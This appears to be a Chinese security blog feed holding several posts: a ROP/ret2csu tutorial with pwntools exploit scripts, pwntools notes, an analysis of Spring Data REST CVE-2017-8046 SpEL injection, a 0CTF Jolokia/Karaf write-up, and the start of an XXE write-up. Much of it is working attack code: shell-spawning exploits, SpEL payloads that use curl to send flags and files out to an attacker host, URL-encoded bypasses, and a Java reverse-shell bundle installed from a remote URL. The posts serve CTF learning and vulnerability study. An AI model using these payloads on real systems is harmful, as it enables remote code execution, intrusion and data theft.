next(libc.search("/bin/sh"))## libc gadget + libc addrpop_rdi_ret_addr = pop_rdi_ret_libc + libc.addressprint "[*]/bin/sh libc addr: " + hex(binsh_addr)payload = "A" * 136 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)print "[*]sending payload..."p.sendline(payload)p.interactive() 除了前面找的pop rdi;ret这个Gadget，我们还可以找另外一个gadget，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链，如下： 可以看到pop rax;pop rdi;call rax这个gadget，我们可以先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。 payload： 12345678910111213141516171819202122232425262728293031from pwn import *p = process("./level4")elf = ELF("./level4")libc = elf.libc#pop|ret## self gadget#pop_rdi_ret_addr = 0x00000000004008b3## libc gadget#pop_rdi_ret_libc = 0x0000000000021102#pop|callpop_call_libc = 0x0000000000107419system_addr = int(p.recv(1024).split()[0], 16)print "[*]recv system() addr: " + hex(system_addr)libc.address = system_addr - libc.symbols["system"]binsh_addr = next(libc.search("/bin/sh"))#pop_rdi_ret_addr = pop_rdi_ret_libc + libc.addresspop_call_addr = pop_call_libc +libc.addressprint "[*]/bin/sh libc addr: " + hex(binsh_addr)#payload = "A" * 136 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)payload = "A" * 136 + p64(pop_call_addr) + p64(system_addr) + p64(binsh_addr)print "[*]sending payload..."p.sendline(payload)p.interactive() level5——通用gadgets 因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。 level5.c代码如下，相比于level3和level4，去掉了提供system()或其地址的辅助函数： 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, "Hello, World\n", 13); vulnerable_function();&#125; 可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段，最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。 编译： 1gcc -fno-stack-protector -o level5 level5.c 基本功能和安全编译开关和前面的一致。 溢出偏移量也和之前的一致，为136。 用objdump -d ./level5观察一下__libc_csu_init()这个函数： 可以看到，利用0x40061a处的代码可以控制rbx、rbp、r12、r13、r14和r15的值，随后利用0x400600处的代码可以将r13的值赋值给rdx、r14的值赋值给rsi、r15的值赋值给edi（这和蒸米原文的顺序是相反的，因为本地编译出来的程序所用的gadget有些许区别，其实这里利用的就是ret2csu技巧），随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。 这里列两种getshell的方法。 Method1——只用ret2csu的Gadget第一种是蒸米讲解的方法，即利用该gadget构造3段payload，分别是泄露write()函数地址、向程序.bss段写入”/bin/sh”和system()或execve()函数地址、传入bss_addr+8处的参数并调用bss_addr地址处的函数即执行system(“/bin/sh”)。 最终exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *p = process('./level5')#p = remote('192.168.17.155',10001)elf = ELF('level5')libc = elf.libcmain = elf.symbols['main']bss_addr = elf.bss()gadget1 = 0x40061agadget2 = 0x400600got_write = elf.got['write']print "[*]write() got: " + hex(got_write)got_read = elf.got['read']print "[*]read() got: " + hex(got_read)def csu(rbx, rbp, r12, r13, r14, r15, ret): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = "A" * 136 payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget2) payload += "B" * 56 payload += p64(ret) return payload#write(rdi=1, rsi=write.got, rdx=4)payload1 = csu(0, 1, got_write, 8, got_write, 1, main)p.recvuntil("Hello, World\n")print "\n#############sending payload1#############\n"p.send(payload1)sleep(1)write_addr = u64(p.recv(8))print "[*]leak write() addr: " + hex(write_addr)libc.address = write_addr - libc.symbols['write']execve_addr = libc.symbols["execve"]print "[*]execve() addr: " + hex(execve_addr)p.recvuntil("Hello, World\n")#read(rdi=0, rsi=bss_addr, rdx=16)payload2 = csu(0, 1, got_read, 16, bss_addr, 0, main)print "\n#############sending payload2#############\n"p.send(payload2)sleep(1)p.send(p64(execve_addr))p.send("/bin/sh\0")sleep(1)p.recvuntil("Hello, World\n")#execve(rdi = bss_addr+8 = "/bin/sh", rsi=0, rdx=0)payload3 = csu(0, 1, bss_addr, 0, 0, bss_addr + 8, main)print "\n#############sending payload3#############\n"sleep(1)p.send(payload3)p.interactive() 简单说下： 由于利用到泄露函数地址和向.bss段写内容的功能，需要先获取write()和read()函数的GOT地址； 本次利用的Gadget即ret2csu，定义一个csu函数，用于构造Gadget传参构造payload，其中payload构造是先填充溢出偏移量的字符、然后根据gadget1来设置对应寄存器的值、再调用gadget2、然后填充字符至gadget1的ret指令处、最后调用输入的返回地址即main处让程序继续执行下去；这里注意两个偏移量，第一个136是程序本身溢出到ret的偏移量，而第二个56则是gadget2跑完之后还要继续往下跑到gadget1的ret中去，这中间需要填充56个字节； payload1利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止； 当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着构造payload2，利用read()将system()或execve()的地址以及“/bin/sh”读入到.bss段内存中； 最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。 在我的本地环境中，利用system()的exp会得不到shell，换了execve()才可以： Method2——利用两个Gadgets其实不用向.bss段写内容再调用，有点繁琐，且同一个Gadget调用了3次。 除了利用ret2csu的gadget，这里还利用到pop rdi|ret这个gadget，主要用于给system(函数的第一个参数赋值并返回往下调用system()函数从而getshell： 基本利用过程就是：通过ret2csu的gadget泄露write()函数的真实地址，通过LibcSearcher或查询的方式得到libc的offset然后计算出system()函数和”/bin/sh”的真实地址，最后利用pop rdi|ret这个gadget构造exp执行system(“/bin/sh”)。 payload如下，下面将改为远程连接的形式： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *from LibcSearcher import *# p = process('./level5')p = remote('192.168.17.155',10001)elf = ELF('level5')gadget1 = 0x40061agadget2 = 0x400600pop_rdi_ret = 0x0000000000400623main_addr = elf.symbols['main']write_got = elf.got['write']print "[*]main() addr: " + hex(main_addr)print "[*]write() got: " + hex(write_got)def csu(rbx, rbp, r12, r13, r14, r15, ret): payload = "A" * 136 payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget2) payload += "B" * 56 payload += p64(ret) return payload#write(rdi=1, rsi=write.got, rdx=4)payload = csu(0, 1, write_got, 8, write_got, 1, main_addr)p.recvuntil("Hello, World\n")print "[*]sending payload to leak write addr..."p.send(payload)sleep(1)write_addr = u64(p.recv(8))print "[*]leak write() addr: " + hex(write_addr)libc = LibcSearcher('write', write_addr)libc_base = write_addr - libc.dump('write')system_addr = libc_base + libc.dump('system')binsh_addr = libc_base + libc.dump('str_bin_sh')print "[*]system() addr: " + hex(system_addr)print "[*]/bin/sh addr: " + hex(binsh_addr)p.recvuntil("Hello, World\n")print "[*]sending exp..."exp = "A" * 136exp += p64(pop_rdi_ret)exp += p64(binsh_addr)exp += p64(system_addr)p.sendline(exp)p.interactive() 当然，也可以不用LibcSearcher这个工具包，而是直接通过查询Libc Database Search的方式自己写地址： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *# p = process('./level5')p = remote('192.168.17.155',10001)elf = ELF('level5')gadget1 = 0x40061agadget2 = 0x400600pop_rdi_ret = 0x0000000000400623main_addr = elf.symbols['main']write_got = elf.got['write']print "[*]main() addr: " + hex(main_addr)print "[*]write() got: " + hex(write_got)def csu(rbx, rbp, r12, r13, r14, r15, ret): payload = "A" * 136 payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget2) payload += "B" * 56 payload += p64(ret) return payload#write(rdi=1, rsi=write.got, rdx=4)payload = csu(0, 1, write_got, 8, write_got, 1, main_addr)p.recvuntil("Hello, World\n")print "[*]sending payload to leak write addr..."p.send(payload)sleep(1)write_addr = u64(p.recv(8))print "[*]leak write() addr: " + hex(write_addr)## libc db search## leak write low 3: 2b0system_offset = 0x045390binsh_offset = 0x18cd57write_offset = 0x0f72b0libc_base = write_addr - write_offsetsystem_addr = libc_base + system_offsetbinsh_addr = libc_base + binsh_offsetprint "[*]system() addr: " + hex(system_addr)print "[*]/bin/sh addr: " + hex(binsh_addr)p.recvuntil("Hello, World\n")print "[*]sending exp..."exp = "A" * 136exp += p64(pop_rdi_ret)exp += p64(binsh_addr)exp += p64(system_addr)p.sendline(exp)p.interactive() getshell： 0x03 参考一步一步学ROP之Linux_x86篇 一步一步学ROP之Linux_x64篇]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwntools笔记]]></title>
    <url>%2F2019%2F04%2F07%2Fpwntools%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0x01 简介pwntools是一个CTF Pwn漏洞利用开发库，用于编写各种与Pwn题目进行交互和攻击利用的脚本。其由Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。 0x02 安装安装：pip install pwntools 当然只是在Linux环境适用，建议安装在Ubuntu环境而非Kali，Kali上会有很多问题。其中对Ubuntu 12.04和14.04的支持最好，但是绝大多数的功能也支持Debian、Arch、FreeBSD、OSX等等。 0x03 各个模块通常在py文件头部写上from pwn import *即可导入所有需要的pwntools工具。 连接方式123sh = porcess("./test")#连接本地程序sh = remote("127.0.0.1",10001)#远程连接sh.close()#关闭连接 IO模块12345678sh.send(data)#发送数据sh.sendline(data)#发送一行数据，相当于在数据后面加\nsh.recv(numb = 2048, timeout = dufault)#接受数据，numb指定接收的字节，timeout指定超时时间sh.recvline(keepends=True)#接受一行数据，keepends为是否保留行尾的\nsh.recvuntil("Hello,World\n",drop=fasle)#接受数据直到我们设置的标志出现sh.recvall()#一直接收直到EOFsh.recvrepeat(timeout = default)#持续接受直到EOF或timeoutsh.interactive()#直接进行交互，相当于回到shell的模式，在取得shell之后使用 ELF文件操作12345678910111213141516&gt;&gt;&gt; e = ELF('/bin/cat')&gt;&gt;&gt; print hex(e.address) # 文件装载的基地址0x400000&gt;&gt;&gt; print hex(e.symbols['write']) # 函数地址0x401680&gt;&gt;&gt; print hex(e.got['write']) # GOT表的地址0x60b070&gt;&gt;&gt; print hex(e.plt['write']) # PLT的地址0x401680&gt;&gt;&gt; print hex(e.search('/bin/sh').next())# 字符串/bin/sh的地址#libc相关libc = e.libclibc.address = libc_start_main_addr - libc.symbols['__libc_start_main']libc.symbols['system']next(libc.search('/bin/sh')) 整数pack与数据unpackpack：p32，p64unpack：u32，u64 汇编和反汇编汇编： 1234&gt;&gt;&gt; asm('nop')'\x90'&gt;&gt;&gt; asm('nop', arch='arm')'\x00\xf0 \xe3' 可以使用context来指定cpu类型以及操作系统： 1234&gt;&gt;&gt; context.arch = 'i386'&gt;&gt;&gt; context.os = 'linux'&gt;&gt;&gt; context.endian = 'little'&gt;&gt;&gt; context.word_size = 32 使用disasm进行反汇编： 12345&gt;&gt;&gt; print disasm('6a0258cd80ebf9'.decode('hex')) 0: 6a 02 push 0x2 2: 58 pop eax 3: cd 80 int 0x80 5: eb f9 jmp 0x0 注意，asm需要binutils中的as工具辅助，如果是不同于本机平台的其他平台的汇编，例如在我的x86机器上进行mips的汇编就会出现as工具未找到的情况，这时候需要安装其他平台的cross-binutils。 Shellcode生成器12345678&gt;&gt;&gt; print shellcraft.i386.nop().strip('\n') nop&gt;&gt;&gt; print shellcraft.i386.linux.sh() /* push '/bin///sh\x00' */ push 0x68 push 0x732f2f2f push 0x6e69622f... 结合asm可以可以得到最终的pyaload： 12345678from pwn import *context(os='linux',arch='amd64')shellcode = asm(shellcraft.sh())或者from pwn import *shellcode = asm(shellcraft.amd64.linux.sh()) 除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等。 ROP链生成器12345678910elf = ELF('ropasaurusrex')rop = ROP(elf)rop.read(0, elf.bss(0x80))rop.dump()# ['0x0000: 0x80482fc (read)',# '0x0004: 0xdeadbeef',# '0x0008: 0x0',# '0x000c: 0x80496a8']str(rop)# '\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08' 使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数。 因为ROP对象实现了getattr的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。 通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。 call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号) chain() : 返回当前的字节序列，即payload dump() : 直观地展示出当前的rop chain raw() : 在rop chain中加上一个整数或字符串 search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget unresolve(value) : 给出一个地址，反解析出符号 GDB调试当在运行py时添加参数M，则会将进程attach到GDB上调试： 12if args.M: gdb.attach(p) DEBUG日志当 context.log_level被设置为 “DEBUG” , 我们的输入和服务器的输出会被直接输出： 1context.log_level = 'DEBUG' 0x04 参考pwntools使用]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅析Spring Data Rest之cve-2017-8046]]></title>
    <url>%2F2019%2F04%2F05%2FSpring-Data-Rest%E4%B9%8Bcve-2017-8046%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 何为Spring Data Rest Spring Data REST是基于Spring Data的repository之上，可以把 repository 自动输出为REST资源，目前支持Spring Data JPA、Spring Data MongoDB、Spring Data Neo4j、Spring Data GemFire、Spring Data Cassandra的 repository 自动转换成REST服务。注意是自动。简单点说，Spring Data REST把我们需要编写的大量REST模版接口做了自动化实现。 0x02 CVE-2017-8046CVE-2017-8046: RCE in PATCH requests in Spring Data REST 简单地说，该漏洞就是攻击者通过Spring Data Rest支持的PATCH方法，构造恶意的Json格式数据发送到服务端，导致服务端在解析数据时会执行任意Java代码、解析SpEL表达式，从而引发SpEL注入漏洞、造成RCE。 影响版本： Spring Data REST versions 2.5.12, 2.6.7, 3.0 RC3之前的版本 Spring Boot versions 2.0.0M4 之前的版本 Spring Data release trains Kay-RC3 之前的版本 漏洞具体信息参考链接。 有个注意点，请求方法为PATCH，Content-Type要设置为application/json-patch+json才能正常访问。 0x03 漏洞分析在github下载一个漏洞Demo jar包。 本地运行并设置远程调试端口： 1java -Xdebug -Xrunjdwp:transport=dt_socket,address=8666,server=y,suspend=n -server -jar spring-data-rest.jar 基本操作访问一遍，显示有两个子路径可以访问： /persons显示已有哪些创建了的用户，而/profile只有一个子目录/profile/persons、其用来配置persons页面的字段属性等信息。 下面正常操作一遍，先创建用户，GET查看到用户信息： 利用PATCH方法的replace操作修改lastName： 漏洞点本次CVE的漏洞出发点在PATCH请求进行某些操作如replace时的path参数存在SpEL注入风险，Spring Data Rest在解析该参数值时会使用spelExpress解析SpEL表达式而未进行任何的校验。 我们可以简单地以上面的PATCH例子往path中注入一下SpEL表达式，作用是本地弹出计算器，注意payload后面的斜杠/必须带上，但lastName可以随意更换为其他内容（至于原因可在下面的调试分析中得知）： 1T(java.lang.Runtime).getRuntime().exec('calc.exe')/lastName 调试分析刚刚已经开了进行远程调试监听的8666端口，直接用IDEA远程连接即可。 简单说下操作：将jar包解压，在IDEA中创建新项目，再右键项目点击Open Module Settings打开设置，在Modules一栏点击右边的+加号添加jar解压后的目录中的lib目录进来，然后点击Apply和OK；点击Run栏，选择Edit Configurations，点击+加号添加Remote，设置IP和端口号为8666，然后点击Debug，当显示Connected to the target VM, address: ‘127.0.0.1:8666’, transport: ‘socket’时即连接成功。 断点打在哪？ 我们前面的Demo示例是通过PATCH方法的replace操作来触发漏洞的，也就是说，我们的操作必然会经过PATCH方法的replace操作类，那么我们找到这个类打断点，程序就必然会经过并停止在该断点，然后我们通过函数调用栈窗口可以反推之前调用哪些类方法，再返回去在关键的地方打断点重新调试即可。 这里我们找到该类在如下路径： 1spring-data-rest/BOOT-INF/lib/spring-data-rest-webmvc-2.6.6.RELEASE.jar!/org/springframework/data/rest/webmvc/json/patch/ReplaceOperation.class 在该处打下断点，必然会经过此处，且看到函数调用栈中有个JsonPatchHandler类，该类应该算是处理Json格式的PATCH请求的类： 到JsonPatchHandler类的apply()和applyPatch()打下断点，重新调试会发现，JsonPatchHandler.apply()方法会调用isJsonPatchRequest()判断请求是否是Json格式的Patch，跟踪进去会发现会校验请求方法是否为PATCH且Content-Type是否为application/json-patch+json，否则会抛出错误，这就是为什么Content-Type必须设置为该值才能触发的原因： 跟踪往下调试进去applyPatch()，其后调用了Patch.convert()，其中识别出replace操作： 继续调试进去，会有个初始化Patch操作的构造函数，从这里可以看到前面Demo为啥需要op等3个参数，且最后一个成员变量spelExpression即是用来解析SpEL表达式的变量，它是SpEL注入漏洞的触发根源，这里调用PathToSpEL.pathToExpression()来解析path参数： 继续跟进调试，发现其进行一个split()切分/的操作，这就解释了为啥Demo的payload中path参数值需要在exp后加上/，因为它这里必须切分路径，而默认正常情况下是“/lastName”： 接着是调用pathNodesToSpEL()，通过调试发现是对/转换为.，然后将path前后路径用.进行拼接： 往下调试，有个初始化spelExpression类对象，其中expression成员变量值为我们注入的SpEL表达式： 往下调试，会创建一个PATCH对象并初始化，然后调用operation.perform()执行PATCH指定操作： 跟进去，调用了setValueOnTarget()，再往后走就是SpEL解析了： 这里我们跟进去看看evaluateValueFromTarget()，顾名思义，该方法用来计算出SpEL表达式的值，其是调用之前初始化好的spelExpression成员变量来解析SpEL表达式： 再往下就是解析完成弹框计算器了。 补丁分析我们看下官方补丁的修补方法： 补丁就是在evaluateValueFromTarget()函数内添加了对path参数值的路径进行合法性校验，若为非法内容则直接抛出错误。 0x04 exp构造通用exp之前本地的exp是，但是这个只能用于本地环境测试： 1T(java.lang.Runtime).getRuntime().exec('calc.exe')/lastName 换一个远程服务的exp就不能上面那样写了，因为没有回显，下面有两种解决办法。 Method1——执行curl带回flag 当然这种情况是目标机子存在curl命令且能够解析`反引号执行命令。 1T(java.lang.Runtime).getRuntime().exec('curl yourip:port/?c=`cat flag`')/lastName 但是从前面的调试知道，程序会切分/，因此命令中的/会被切分导致不能到达预期效果，这时就引入了第二种更方便的方法。 Method2——构造回显exp 情况当然没有那么好，`反引号很多时候会无法被正常解析，这时就使用如下的StreamUtils包的copy()方法实现输入输出流来构造回显exp即可。 1T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec('cat flag.txt').getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/Mi1k7ea 示例以Windows本地为例： 使用JavaScipt引擎和之前的javacon中的exp类似，这里再演示一遍。 先来本地弹计算器测试： 1T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.lang.Runtime).getRuntime().exec('calc.exe'))/Mi1k7ea Method1——URL编码 前面遇到的情况是通用exp是一样的，即无法在命令中输入/，但我们可以通过URL编码绕过： URL编码内容为： 1java.lang.Runtime.getRuntime().exec(&apos;curl http://192.168.43.201:1234/?`whoami`&apos;) exp： 1T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.net.URLDecoder).decode('%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%34%33%2e%32%30%31%3a%31%32%33%34%2f%3f%60%77%68%6f%61%6d%69%60%27%29'))/Mi1k7ea 可以看到是执行成功了，但是`反引号并没有被成功解析成命令执行。 这时用curl -T参数来将flag带回我们的FTP服务器中： 1T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.net.URLDecoder).decode('%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%75%72%6c%20%2d%54%20%66%6c%61%67%2e%74%78%74%20%66%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%34%33%2e%32%30%31%27%29'))/Mi1k7ea 其中URL编码内容为： 1java.lang.Runtime.getRuntime().exec('curl -T flag.txt ftp://192.168.43.201') Method2——构造回显exp 和通用exp中一样，利用一样的包的copy()方法实现回显。 1T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.lang.Runtime).getRuntime().exec('calc')),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/Mi1k7ea 这个exp只能在Windows本地打开计算器等文件的功能，执行变量其他操作类的命令： 添加个URL编码： 1T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.net.URLDecoder).decode('%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%70%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29')),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/Mi1k7ea 其中URL编码内容为： 1java.lang.Runtime.getRuntime().exec("ipconfig").getInputStream() 工具直接参考Github上的一个项目即可。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0CTF Web writeup]]></title>
    <url>%2F2019%2F03%2F31%2F0CTF-Web-writeup%2F</url>
    <content type="text"><![CDATA[本次writeup，纯属复现 : ) 0x01 Ghost Pepper题目地址 访问题目，提示该站点是Karaf，需要输入用户名和密码： Karaf是一个基于OSGi的框架，而OSGi是一个Java平台，允许在运行时管理应用程序组件的生命周期，而无需重新启动应用程序。我们可以在应用程序运行时在运行时添加/删除/替换组件，部署多个版本等。Karaf框架中的用户名和密码默认均为karaf，输入进去后是个404页面： 页面显示是使用Jetty作为Web服务器的，除此之外没找到更多的信息。 搜一下题目Ghost pepper，在Wiki百科发现其别名为Bhut jolokia，然后再搜索一遍Bhut jolokia，发现Jolokia是一个JMX-HTTP桥接器，可替代JSR-160连接器。它是一种基于代理的方法，支持许多平台。除了基本的JMX操作之外，它还通过批量请求和细粒度安全策略等独特功能增强了JMX远程处理功能。 那就是说，该站点应该支持Jolokia，访问一下该路径看看，果然返回了Json格式的数据： 访问list，列出Jolokia所支持的所有操作： 这里只列下前面的Java类： 12345678910111213141516171819java.util.loggingorg.eclipse.jetty.server.sessionorg.ops4j.pax.web.service.jetty.internalorg.eclipse.jetty.jmxosgi.compendiumjava.nioorg.apache.karafJMImplementationorg.eclipse.jetty.util.threadjava.langcom.sun.managementjmx4perlconnectorsun.nio.chorg.eclipse.jetty.serverorg.apache.aries.blueprintorg.eclipse.jetty.ioosgi.corejolokia 注意到org.apache.karaf这个类，就是说我们可以通过Karaf JMX执行各种操作。下面就来找下该karaf类所支持的所有方法： 其中可以看到很多操作命名为install，因此我们可以利用这些API来加载安装并部署我们直接编写的恶意jar程序。 下面有两种方法来解它。 Method1——安装WebConsoleKaraf框架是拥有一个WebConsole的，可以通过Web端进行控制台的交互，前面我们获取了org.apache.karaf的所有支持的方法，找到其中的installFeature()，编写如下安装WebConsole的payload： 1http://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole 然后在URL栏访问Karaf的WebConsole界面，直接输入命令即可得到flag： 1http://111.186.63.207:31337/system/console/gogo Method2——安装恶意bundle在之前的org.apache.karaf类中，还可以参考这篇文章通过install方法来进行利用。 除了该类外，还可以通过osgi.core的installBundleFromURL，这个方法可以通过URL来安装bundle，我们可以通过如下的方法找到该方法： 此时我们可以构造一个恶意bundle打包成jar放置在我们自己的服务器中，然后访问Karaf服务让其下载并安装部署我们的恶意bundle从而实现反弹shell： 123456789101112131415161718192021222324252627282930313233343536373839404142import org.osgi.framework.BundleActivator;import org.osgi.framework.BundleContext;import java.io.*;import java.net.Socket;public class Activator implements BundleActivator&#123; public void start(BundleContext paramBundleContext) throws Exception &#123; String str = "1.2.3.4"; int i = 12345; Socket localSocket = new Socket(str, i); localSocket.getOutputStream().write("Mi1k7ea".getBytes()); localSocket.getOutputStream().flush();// localSocket.close(); try &#123; String ShellPath; ShellPath = new String("/bin/sh"); Socket socket = new Socket( str, i ); Process process = Runtime.getRuntime().exec( ShellPath ); ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start(); ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start(); process.waitFor(); &#125; catch( Exception e ) &#123;&#125; localSocket.getOutputStream().write("Mi1k7ea".getBytes()); localSocket.getOutputStream().flush(); localSocket.close(); &#125; public void stop(BundleContext paramBundleContext) throws Exception &#123; System.out.println("RIP"); &#125;&#125; 获取一下该类的uuid： 然后通过installBundleFromURL方法来下载安装恶意bundle： 12345678910111213141516171819202122POST /jolokia/list HTTP/1.1Host: 111.186.63.207:31337Cache-Control: max-age=0Authorization: Basic a2FyYWY6a2FyYWY=Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: JSESSIONID=h1fouerlv92j1nzj1rn7f4hyuConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0&#123; &quot;type&quot;: &quot;exec&quot;, &quot;mbean&quot;: &quot;osgi.core:framework=org.eclipse.osgi,type=framework,uuid=089717e7-f953-42ec-959f-cd2488bc6482,version=1.7&quot;, &quot;operation&quot;: &quot;installBundleFromURL&quot;, &quot;arguments&quot;: [ &quot;moxiaoxi&quot;, &quot;http://a.com:666/m7.jar&quot; ]&#125; 通过response的id，来启动bundle，就可以获得一个反弹shell： 1&#123; "type": "exec", "mbean": "osgi.core:framework=org.eclipse.osgi,type=framework,version=1.7,uuid=089717e7-f953-42ec-959f-cd2488bc6482", "operation": "startBundle", "arguments": [ "93" ] &#125; 0x02 Wallbreaker Easy题目地址，已关闭。 环境待复现… 参考TCTF2019 Web WP]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Securinets CTF Web writeup]]></title>
    <url>%2F2019%2F03%2F29%2FSecurinets-CTF-Web-writeup%2F</url>
    <content type="text"><![CDATA[0x01 Feedback题目地址，题目描述如下，提示flag保存在flag文件中： 访问页面，是一个输入界面： 随便填写内容，Send后发现在下方有回显： 抓包发现发送的是XML格式的数据： 推测考察的是XXE读取文件，换个XXE payload测试是否解析参数实体： 没问题，那就读取本地文件/etc/passwd试试： 问题来了，读取flag文件，但不知道绝对路径呀，这里file://伪协议只能读取绝对路径的文件。 那就换个php://filter伪协议吧，它可以读取相对路径，直接尝试读本目录的flag文件吧： 读到了flag，解码为Securinets{XxexXE@Ll_Th3_W@Y}。 当然，可以修改payload看看这个feed.php的内容如下： 1234567891011&lt;?phplibxml_disable_entity_loader (false);//$xmlfile = $_POST["ta"];$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$feedback = simplexml_import_dom($dom);$author = $feedback-&gt;author;echo "&lt;h4&gt;Thanks For you Feedback $author&lt;/h4&gt;"?&gt; 0x02 Custom Location题目地址，题目描述如下，说是找出数据库资格证： 